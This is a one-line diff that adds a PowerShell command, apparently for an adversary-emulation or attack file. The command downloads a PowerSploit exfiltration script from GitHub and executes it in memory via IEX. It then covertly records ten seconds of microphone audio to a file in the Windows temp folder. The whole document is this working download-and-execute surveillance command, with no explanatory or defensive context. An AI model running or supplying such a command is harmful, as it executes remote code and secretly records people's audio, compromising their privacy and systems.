@@ -1,0 +1,1 @@
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1'); Get-MicrophoneAudio -Path c:\windows\temp\secret.wav -Length 10 -Alias "SECRET"
